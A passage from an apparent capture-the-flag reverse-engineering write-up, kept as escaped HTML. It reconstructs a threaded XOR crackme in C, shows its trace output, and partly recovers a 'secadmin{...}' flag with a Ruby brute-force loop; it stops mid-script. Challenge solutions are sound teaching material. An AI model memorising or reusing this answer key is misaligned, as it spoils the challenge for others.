    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TR1 -&amp;gt; 0x%02x ^ 22&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TR1 -&amp;gt; j[%d] = 0x%02x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0.2 segundos&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0.4 segundos&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TR2 -&amp;gt; 0x%02x = 0x%02x ^ 0x%02x ^ 0x80&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; -&amp;gt; 0x%2x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr1_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr2_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Starting! ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Size of s: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tr1_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tr1_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;s: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sizeof j: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wiiiiiiiin!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Looooooose!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When executed, we obtain the following output, which clears us what the program is doing:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting! ...
Size of s: 22
TR1 -&amp;gt; 0x73 ^ 22
TR1 -&amp;gt; j[0] = 0x65
TR1 -&amp;gt; 0x65 ^ 22
TR1 -&amp;gt; j[1] = 0x73

TR2 -&amp;gt; 0x65 = 0x65 ^ 0x74 ^ 0x80 -&amp;gt; 0xffffff91

TR1 -&amp;gt; 0x63 ^ 22
TR1 -&amp;gt; j[2] = 0x75
TR1 -&amp;gt; 0x61 ^ 22
TR1 -&amp;gt; j[3] = 0x77

TR2 -&amp;gt; 0x73 = 0x73 ^ 0x74 ^ 0x80 -&amp;gt; 0xffffff87

TR1 -&amp;gt; 0x64 ^ 22
TR1 -&amp;gt; j[4] = 0x72
TR1 -&amp;gt; 0x6d ^ 22
TR1 -&amp;gt; j[5] = 0x7b

TR2 -&amp;gt; 0x75 = 0x75 ^ 0x1b ^ 0x80 -&amp;gt; 0xffffffee

TR1 -&amp;gt; 0x69 ^ 22
TR1 -&amp;gt; j[6] = 0x7f
TR1 -&amp;gt; 0x6e ^ 22
TR1 -&amp;gt; j[7] = 0x78

TR2 -&amp;gt; 0x77 = 0x77 ^ 0x1b ^ 0x80 -&amp;gt; 0xffffffec

TR1 -&amp;gt; 0x7b ^ 22
TR1 -&amp;gt; j[8] = 0x6d
TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[9] = 0x57

TR2 -&amp;gt; 0x72 = 0x72 ^ 0xffffffde ^ 0x80 -&amp;gt; 0x2c

TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[10] = 0x57
TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[11] = 0x57

TR2 -&amp;gt; 0x7b = 0x7b ^ 0xffffffde ^ 0x80 -&amp;gt; 0x25

TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[12] = 0x57
TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[13] = 0x57

TR2 -&amp;gt; 0x7f = 0x7f ^ 0xffffffde ^ 0x80 -&amp;gt; 0x21

TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[14] = 0x57
TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[15] = 0x57

TR2 -&amp;gt; 0x78 = 0x78 ^ 0xfffffff6 ^ 0x80 -&amp;gt; 0x e

TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[16] = 0x57
TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[17] = 0x57

TR2 -&amp;gt; 0x6d = 0x6d ^ 0xfffffff6 ^ 0x80 -&amp;gt; 0x1b

TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[18] = 0x57
TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[19] = 0x57

TR2 -&amp;gt; 0x57 = 0x57 ^ 0x67 ^ 0x80 -&amp;gt; 0xffffffb0

TR1 -&amp;gt; 0x41 ^ 22
TR1 -&amp;gt; j[20] = 0x57
TR1 -&amp;gt; 0x7d ^ 22
TR1 -&amp;gt; j[21] = 0x6b

TR2 -&amp;gt; 0x57 = 0x57 ^ 0x67 ^ 0x80 -&amp;gt; 0xffffffb0
...

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s easy to see the pattern, right? &lt;code class=&quot;highlighter-rouge&quot;&gt;tr1&lt;/code&gt; creates two new bytes on &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.j&lt;/code&gt; global variable, and then &lt;code class=&quot;highlighter-rouge&quot;&gt;tr2&lt;/code&gt; takes one byte, transform it using &lt;code class=&quot;highlighter-rouge&quot;&gt;t[2*tiempo]&lt;/code&gt; value.&lt;/p&gt;

&lt;p&gt;As you can see, our input (the &lt;code class=&quot;highlighter-rouge&quot;&gt;msg&lt;/code&gt; variable), when transformed by &lt;code class=&quot;highlighter-rouge&quot;&gt;tr2&lt;/code&gt; needs to be equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; variable byte by byte. We guessed that &lt;code class=&quot;highlighter-rouge&quot;&gt;msg&lt;/code&gt; should start with &lt;code class=&quot;highlighter-rouge&quot;&gt;secadmin{&lt;/code&gt; as this is the flag format of the challenges. If you take a look, first &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; variable bytes are: &lt;code class=&quot;highlighter-rouge&quot;&gt;0x91,0x87,0xEE,0xEC,0x2C,0x25,0x21,0x0e,0x1b&lt;/code&gt;, and our &lt;code class=&quot;highlighter-rouge&quot;&gt;tr2&lt;/code&gt; function output is doing it correctly! This confirms that our guess was correct, and also means that the last character of &lt;code class=&quot;highlighter-rouge&quot;&gt;msg&lt;/code&gt; might be &lt;code class=&quot;highlighter-rouge&quot;&gt;}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Well, we just need to find which ascii values satisfies the formula for this string &lt;code class=&quot;highlighter-rouge&quot;&gt;secadmin{AAAAAAAAAAAA}&lt;/code&gt;, been each &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;, a value to guess.&lt;/p&gt;

&lt;p&gt;As you can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;t[2*tiempo]&lt;/code&gt; follows always the same pattern, so with a simple ruby script, we can guess this characters:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x93&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7D&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;x: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
